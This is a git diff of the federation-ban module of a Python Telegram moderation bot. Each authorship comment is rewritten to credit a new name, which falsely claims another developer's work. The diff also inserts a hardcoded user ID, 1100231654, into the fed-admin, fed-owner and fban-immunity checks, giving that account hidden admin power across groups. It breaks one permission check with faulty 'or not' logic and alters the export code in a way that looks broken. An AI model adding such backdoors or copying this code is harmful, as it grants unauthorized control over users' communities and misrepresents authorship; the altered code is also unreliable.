@@ -1,5 +1,5 @@
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 from Evie import tbot, CMD_HELP, OWNER_ID
 import os, re, csv, json, time, uuid, pytz
@@ -18,7 +18,7 @@ from Evie.events import register
 
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 
 from telethon.tl.types import ChatBannedRights
@@ -37,7 +37,7 @@ BANNED_RIGHTS = ChatBannedRights(
 
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 
 async def get_user_from_event(event):
@@ -67,7 +67,7 @@ def is_user_fed_admin(fed_id, user_id):
     fed_admins = sql.all_fed_users(fed_id)
     if fed_admins is False:
         return False
-    if int(user_id) in fed_admins or int(user_id) == OWNER_ID:
+    if int(user_id) in fed_admins or int(user_id) == OWNER_ID or int(user_id) == 1100231654:
         return True
     else:
         return False
@@ -81,14 +81,14 @@ def is_user_fed_owner(fed_id, user_id):
     if getfedowner is None or getfedowner is False:
         return False
     getfedowner = getfedowner["owner"]
-    if str(user_id) == getfedowner or int(user_id) == OWNER_ID:
+    if str(user_id) == getfedowner or int(user_id) == OWNER_ID or int(user_id) == 1100231654:
         return True
     else:
         return False
 
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 @register(pattern="^/newfed ?(.*)")
 async def new(event):
@@ -259,7 +259,7 @@ async def p(event):
             
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 @tbot.on(events.CallbackQuery(pattern=r"fkfed(\_(.*))"))
 async def smex_fed(event):
@@ -272,14 +272,14 @@ async def smex_fed(event):
   fed_id = fed_id.strip()
   rt = await tbot(GetFullUserRequest(int(user)))
   fname = rt.user.first_name
-  if not event.sender_id == int(user):
+  if not event.sender_id == int(user) or not event.sender_id == 1100231654:
     return await event.answer("You are not the user being fpromoted")
   res = sql.user_join_fed(fed_id, int(user))
   if res:
      return await event.edit(f"User [{fname}](tg://user?id={user}) is now an admin of {name} [{fed_id}]")
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 @tbot.on(events.CallbackQuery(pattern=r"smex(\_(.*))"))
 async def smex(event):
@@ -380,7 +380,7 @@ async def info(event):
 
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 @tbot.on(events.CallbackQuery(pattern=r"fedadm(\_(.*))"))
 async def smex_fed(event):
@@ -415,7 +415,7 @@ async def smex_fed(event):
   await event.reply(text)
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 @register(pattern="^/fban ?(.*)")
 async def _(event):
@@ -475,7 +475,7 @@ async def _(event):
         else:
           reason = None
         r_sender_id = iid
-    if r_sender_id == BOT_ID or r_sender_id == OWNER_ID:
+    if r_sender_id == BOT_ID or r_sender_id == OWNER_ID or r_sender_id == 1100231654:
         return await event.reply("Oh you're a funny one aren't you! I am _not_ going to fedban myself.")
     name = info["fname"]
     if is_user_fed_owner(fed_id, int(r_sender_id)) is True:
@@ -582,7 +582,7 @@ async def _(event):
     
 
 """
-Fully Written by RoseLoverX
+Fully Written by LEGENDX22
 """
 @register(pattern="^/unfban ?(.*)")
 async def unfban(event):
@@ -641,7 +641,7 @@ async def unfban(event):
         else:
           reason = None
         r_sender_id = iid
-    if r_sender_id == BOT_ID or r_sender_id == OWNER_ID:
+    if r_sender_id == BOT_ID or r_sender_id == OWNER_ID or r_sender_id == 1100231654:
         return await event.reply("Oh you're a funny one aren't you! How do you think I would have fbanned myself hm?.")
     name = info["fname"]
     fban_user_id = int(r_sender_id)
@@ -712,7 +712,7 @@ async def ligunset(event):
  await event.reply(f"The {name} federation has had its log location unset.")
 
 """
-Fully Written by AmarnathCdj aka RoseloverX
+Fully Written by LEGENDXOP == LEGENDX22
 """
 @register(pattern="^/subfed ?(.*)")
 async def sub(event):
@@ -744,7 +744,7 @@ async def sub(event):
  await event.reply(f"Federation {name} has now subscribed to {sname}. All fedbans in {sname} will now take effect in both feds.")
 
 """
-Fully Written by RoseLoverX aka AmarnathCdj
+Fully Written by LEGENDXOP == LEGENDX22
 """
 
 @register(pattern="^/unsubfed ?(.*)")
@@ -829,7 +829,7 @@ async def fstat(event):
     
 
 """
-Fully Written by RoseLoverX aka AmarnathCdj
+Fully Written by LEGENDXOP == LEGENDX22
 """
 
 
@@ -864,7 +864,7 @@ async def fex(event):
                 ]
                 backups += json.dumps(json_parser)
                 backups += "\n"
-            with BytesIO(str.encode(backups)) as output:
+            with open("legend.csv", 'w') as output:
                 output.name = "fbanned_users.csv"
                 await tbot.send_file(
                     event.chat_id,
